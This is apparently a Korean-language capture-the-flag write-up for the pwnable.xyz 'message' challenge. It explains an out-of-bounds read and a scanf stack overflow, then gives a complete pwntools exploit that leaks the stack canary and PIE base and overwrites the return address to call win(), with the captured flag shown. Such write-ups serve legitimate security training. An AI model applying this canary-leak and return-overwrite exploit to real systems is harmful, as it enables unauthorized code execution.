# [pwnable.xyz] message

:writing_hand: [h0meb0dy](mailto:h0meb0dysj@gmail.com)

> Leave a message for the admin.
>
> Release: [message.zip](https://github.com/h0meb0dy/pwnable.xyz/files/8987425/message.zip)

## Mitigation

![image](https://user-images.githubusercontent.com/104156058/175832599-5ff8b292-26f7-46a4-8930-cd8e53cc29ca.png)

## Analysis

### `win()`

```c
int win()
{
  return system("cat flag");
}
```

`win()`이 실행되도록 하면 플래그를 획득할 수 있다.

### `main()`

```c
  puts("Message taker.");
  printf("Message: ");
  _isoc99_scanf("%s", message);
  getchar();
```

처음에 `message`를 입력받는다.

#### 1. Edit message

```c
      if ( choice != 1 )
        break;
      printf("Message: ");
      _isoc99_scanf("%s", message);
      getchar();
```

`message`를 다시 입력받는다.

#### 2. Print message

```c
    if ( choice == 2 )
    {
      printf("Your message: %s\n", message);
    }
```

`message`의 내용을 출력한다.

#### 3. Admin?

```c
else if ( choice == 3 )
{
  if ( admin )
    win();
}
```

전역 변수 `admin`의 값이 0이 아니면 `win()`을 호출한다.

## Exploit

`message`를 `scanf("%s")`로 입력받기 때문에 BOF가 발생한다. 이를 이용하여 `main()`의 return address를 `win()`의 주소로 덮어쓰면 플래그를 획득할 수 있는데, 그러기 위해서는 canary를 우회해야 하고, `win()`의 주소를 알아내야 한다.

### PIE leak & canary leak

```c
__int64 get_choice()
{
  char offset; // [rsp+Dh] [rbp-13h]
  char stack[10]; // [rsp+Eh] [rbp-12h]
  unsigned __int64 v3; // [rsp+18h] [rbp-8h]

  v3 = __readfsqword(0x28u);
  stack[0] = 0;
  stack[1] = 1;
  stack[2] = 2;
  stack[3] = 3;
  stack[4] = 4;
  stack[5] = 5;
  stack[6] = 6;
  stack[7] = 7;
  stack[8] = 8;
  stack[9] = 9;
  offset = getchar();
  getchar();
  return (unsigned __int8)stack[offset - 0x30];
}
```

`choice`를 선택할 때 `get_choice()` 함수를 실행하는데, 이 함수에서 OOB 취약점이 발생한다. `offset`에 `0x00`부터 `0xff`까지 임의의 값을 입력하면, `stack[offset - 0x30]`에 저장된 1바이트 값을 반환한다.

```c
    else
    {
LABEL_14:
      printf("Error: %d is not a valid option\n", (unsigned int)choice);
    }
```

만약 `choice`가 `0`~`3`이 아니면, `get_choice()`의 반환값을 출력해준다. 이를 이용하여 스택에 저장된 canary와 PIE 주소를 leak할 수 있다.

![image](https://user-images.githubusercontent.com/104156058/175888378-1dc8dc5c-9441-4aec-bc8f-21b28298d97a.png)

`get_choice()`의 `rsp+0x18`에 있는 canary와, `rsp+0x28`에 있는 `main+113`의 주소를 출력하면 된다. `get_choice()`의 반환값이 `0`이면 `main()`이 종료되기 때문에, canary를 leak할 때는 마지막 1바이트를 제외한다.

```python
# canary leak

canary = '\x00'

for offset in range(11, 18):
    sla('> ', chr(offset + 0x30))
    r.recvuntil('Error: ')
    canary += chr(int(r.recvuntil(' ')[:-1]))

canary = u64(canary)
log.info('canary: ' + hex(canary))


# PIE leak

pie = ''

for offset in range(26, 32):
    sla('> ', chr(offset + 0x30))
    r.recvuntil('Error: ')
    pie += chr(int(r.recvuntil(' ')[:-1]))

pie = pie.ljust(8, '\x00')
pie = u64(pie) - 0xb30 # PIE base
log.info('PIE base: ' + hex(pie))
```

```
$ python3 ex.py
[+] Starting local process './release/challenge': pid 292
[*] canary: 0xe86440dc828b2700
[*] PIE base: 0x558b44c00000
```

### RET overwrite

```python
# RET overwrite

payload = b'A' * 0x28
payload += p64(canary)
payload += b'A' * 8
payload += p64(win)

sla('> ', '1')
sla('Message: ', payload)

sla('> ', '0') # return main()
```

### Full exploit

```python
from pwn import *

REMOTE = True

if not REMOTE:
    r = process('./release/challenge')
else:
    r = remote('svc.pwnable.xyz', 30017)

sla = r.sendlineafter
sa = r.sendafter

win_offset = 0xaac # offset of win() from PIE base


sla('Message: ', 'A')


# canary leak

canary = '\x00'

for offset in range(11, 18):
    sla('> ', chr(offset + 0x30))
    r.recvuntil('Error: ')
    canary += chr(int(r.recvuntil(' ')[:-1]))

canary = u64(canary)
log.info('canary: ' + hex(canary))


# PIE leak

pie = ''

for offset in range(26, 32):
    sla('> ', chr(offset + 0x30))
    r.recvuntil('Error: ')
    pie += chr(int(r.recvuntil(' ')[:-1]))

pie = pie.ljust(8, '\x00')
pie = u64(pie) - 0xb30 # PIE base
log.info('PIE base: ' + hex(pie))
win = pie + win_offset


# RET overwrite

payload = b'A' * 0x28
payload += p64(canary)
payload += b'A' * 8
payload += p64(win)

sla('> ', '1')
sla('Message: ', payload)

sla('> ', '0') # return main()


r.interactive()
```

```
$ python3 ex.py
[+] Opening connection to svc.pwnable.xyz on port 30017: Done
[*] canary: 0x947e41148570e300
[*] PIE base: 0x5582ea9b6000
[*] Switching to interactive mode
FLAG{canary_l34k_checked}
```
